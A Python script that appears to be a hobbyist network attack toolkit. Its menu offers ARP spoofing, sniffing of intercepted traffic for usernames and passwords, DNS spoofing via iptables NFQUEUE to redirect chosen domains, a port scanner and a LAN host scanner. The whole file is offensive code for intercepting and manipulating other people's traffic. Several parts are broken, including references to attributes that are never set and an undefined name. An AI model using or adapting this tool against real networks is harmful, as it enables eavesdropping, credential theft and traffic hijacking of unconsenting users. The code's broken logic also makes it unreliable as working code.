import scapy.all as sc
from time import sleep
from subprocess import call
import socket
from sys import exit
from scapy.layers import http
from tkinter import *
from colorama import init, Fore, Style
from netfilterqueue import NetfilterQueue           
from threading import Thread, Lock
from queue import Queue        
from sys import exit

class arp_spoof:
    def __init__(self, cikl, time, Tar_IP, Route_IP, choice):
        self.number_of_sent=0
        self.stopped=False
        Tar_Mac=self.get_Mac_by_IP(Tar_IP)
        Route_Mac=self.get_Mac_by_IP(Route_IP)
        if choice == 'snif':
            Thread(target=self.snif, args=(input(f'[+]Enter interface ⟶ {Style.RESET_ALL}'), )).start()
        elif choice == 'queue':
            blocked_pages = input(f'{Fore.LIGHTBLACK_EX}[+]Enter spoofing pages, using cumma ⟶ ').replace(' ', '')
            self.ip_spoof = input(f'{Fore.GREEN}[+]Enter new IP of spoofing pages ⟶ {Style.RESET_ALL}')
            if ',' in blocked_pages:
                blocked_pages=blocked_pages.split(',')
                self.pages=[]
                for blocked_page in blocked_pages:
                    blocked_page=blocked_page.replace('https://', '').replace('http://', '') 
                    self.pages.append(blocked_page)
            else:
                self.pages=[blocked_pages.replace('https://', '').replace('http://', '')]
            Thread(target=self.queue_run, args=()).start()
        Thread(target=self.spoof, args=(Tar_IP, Tar_Mac, Route_IP, Route_Mac, cikl, time, )).start()
        while True:
            sleep(time)
            if self.stopped == False:  
                print(f'[+]Sent {self.number_of_sent} packets.', end='\r')
            else:
                print('\rStopped', end='')            

    def get_Mac_by_IP(self, IP):
        while True:
            for index in range(200):
                try:
                    packet=sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=IP)
                    ans=sc.srp(packet, verbose=False, timeout=1)[0]
                    return ans[0][1].hwsrc
                    break
                except:
                    pass
            print('\r[-]Can`t find this host in the network!')

    def get_IP_by_Mac(self, Mac):
        while True:
            for index in range(200):
                try:
                    packet=sc.Ether(dst=Mac)/sc.ARP(pdst='192.168.1.1/24')
                    ans=sc.srp(packet, verbose=False, timeout=1)[0]
                    return ans[0][1].psrc
                    break
                except:
                    pass
            print('\r[-]Can`t find this host in the network!')

    def spoof(self, Target_IP, Tar_Mac, Spoof_IP, Spoof_Mac, cikl, time):
        pack1 = sc.ARP(op=2, pdst=Target_IP, hwdst=Tar_Mac, psrc=Spoof_IP)
        pack2 = sc.ARP(op=2, pdst=Spoof_IP, hwdst=Spoof_Mac, psrc=Target_IP)
        while True:
                if self.sent % cikl == 0:
                    Target_IP=self.get_IP_by_Mac(Tar_Mac)
                    Spoof_IP=self.get_IP_by_Mac(Spoof_Mac)
                    pack1 = sc.ARP(op=2, pdst=Target_IP, hwdst=Tar_Mac, psrc=Spoof_IP)
                    pack2 = sc.ARP(op=2, pdst=Spoof_IP, hwdst=Spoof_Mac, psrc=Target_IP)
                sc.send(pack1, verbose=False, count=4)
                sc.send(pack2, verbose=False, count=4)
                self.number_of_sent+=2
                sleep(time)

    def snif(self, interface):
        sc.sniff(iface=interface, store=False, prn=self.process_sniffed_paccket)

    def get_auth_info(self, text):
        for verb in ['pass', 'nick', 'name', 'user']:
            if verb in text or '":"' in text:
                return 1
            elif verb in text:
                return 2
        return False

    def process_sniffed_paccket(self, packet):
        if packet.haslayer(sc.Raw) and packet.haslayer(sc.IP):
            if self.Target_IP not in str(packet[IP].src):
                try:
                    url=packet.Host + packet.Path
                    print(f'[+] HTTP/HTTPS Request >> {url}', end='\n\n')
                except:
                    pass

                load_data = str(packet[sc.Raw].load).replace('\\n', '\n').replace('\\r', '\r')
                data_info = self.get_auth_info(load_data)
                format_string = 'Username/password' if data_info == 1 else 'Some data' if data_info == 2 else None
                if format_string:
                    print(f'\n\n[+] {format_string} >> \n{load_data}\n\n')

    def queue_run(self):
        call('sudo iptables --flush', shell=True)
        call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1', shell=True)
        call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
        qu = NetfilterQueue()
        qu.bind(1, self.process_packet)
        try:
            qu.run()
        except KeyboardInterrupt:
            call('iptables --flush', shell=True)

    def process_packet(self, packet):
        scapy_packet = sc.IP(packet.get_payload())
        if scapy_packet.haslayer(sc.DNSRR):
            qname = scapy_packet[sc.DNSQR].qname
            stq=str(qname)
            for domen in self.alls:
                if domen[1:-1] in stq:
                    print("[+] Spoofing target...")
                    answer = sc.DNSRR(rrname = qname, rdata = self.ip_spoof)
                    scapy_packet[sc.DNS].an = answer
                    scapy_packet[sc.DNS].ancount = 1
                    scapy_packet.dport=443
                    if scapy_packet.haslayer(sc.IP):
                        del scapy_packet[sc.IP].len
                        del scapy_packet[sc.IP].chksum
                        if '127.0.0.1' in scapy_packet[sc.IP].src:
                            scapy_packet[sc.IP].dst=self.Route_IP
                        else:
                            scapy_packet[sc.IP].dst=self.Route_IP
                    if scapy_packet.haslayer(sc.UDP):
                        del scapy_packet[sc.UDP].chksum
                        del scapy_packet[sc.UDP].len
                    if scapy_packet.haslayer(sc.UDP):
                        print(scapy_packet[sc.IP].show())
                    packet.set_payload(bytes(scapy_packet))
        packet.accept()

class Scan:
    def __init__(self, host, N_THREADS):
        self.host=host
        self.GREEN = Fore.GREEN
        self.RESET = Fore.RESET
        self.GRAY = Fore.LIGHTBLACK_EX
        self.N_THREADS = N_THREADS
        self.q = Queue()
        self.print_lock = Lock()
        for t in range(self.N_THREADS):
            t = Thread(target=self.scan_thread)
            t.daemon = True
            t.start()
        for worker in range(65536):
            self.q.put(worker)
        self.q.join()
        sleep(0.4)
    def port_scan(self, port):
        try:
            s = socket.socket()
            s.connect((self.host, port))
        except:
            print(f"{self.GRAY}{port:5} is closed  {self.RESET}", end='\r')
        else:
            print(f"{self.GREEN}{self.host:15}:{port:5} is open  {self.RESET}")
        s.close()

    def scan_thread(self):
        while True:
            worker = self.q.get()
            self.port_scan(worker)
            self.q.task_done()

class scanner_wifi:
    def __init__(self):
        print(f'{Fore.BLUE}   IP\t\t\tMAC')
        for i in self.scan('192.168.1.1/24'):
            print(f'{i[0]}\t  {i[1]}')
        print(Style.RESET_ALL, end='')

    def scan(self, ip):
        ipandmac=[]
        ans=sc.srp(sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=ip), timeout=1, verbose = False)[0]
        for i in ans:
            ipandmac.append([i[1].psrc, i[1].hwsrc])
        return ipandmac

exit_ = lambda: exit(str(reset)+'\r[-]Exiting...')
green = Fore.GREEN
red = Fore.CYAN
reset = Style.RESET_ALL
print(reset, end='')
try:
    while True:
        print(f"{red}1. ARP Spoof\n{green}2. ARP Spoof + Snif\n{red}3. DNS Spoofing\n{green}4. Ports scan\n{red}5. Wifi Scanner{reset}\n\n6. Clear\n7. Exit\n")
        a=input(Fore.MAGENTA)
        if a in '123':
            cikl=int(input(f'{Fore.GREEN}[+] Enter cicle --> '))
            time=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter time --> '))
            call('sysctl -w net.ipv4.ip_forward='+input(f'{Fore.GREEN}[+] Forwarding 0/1 --> '), shell=True)
            Route_IP=input(f'{Fore.LIGHTBLACK_EX}[+]Enter Router IP --> ')
            Tar_IP=Route_IP+input(f'{Fore.GREEN}[+]Enter Target IP --> {Route_IP}')
            if a == '1':
                arp_spoof(cikl, time, Tar_IP, Route_IP, 'not')
            if a == '2':
                arp_spoof(cikl, time, Tar_IP, Route_IP, 'snif')
            if a == '3':
                arp_spoof(cikl, time, Tar_IP, Route_IP, 'queue')
        elif a == '4':
            host=input(f'{Fore.GREEN}[+] Enter host --> ')
            threads=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter number of threads --> {Fore.MAGENTA}'))
            Scan(host, threads)
        elif a == '5':
            scanner_wifi()
        elif a =='6':
            call('clear')
        else:
            exit_()
        if a != '6':
            print(f'\n{green}1. Go next with clear\n2. Go next without clear{reset}')
            ch=input(Fore.MAGENTA)
            if ch == '1':
                call('clear')
            elif ch == '2':
                print('\n\n')
except:
    exit_()
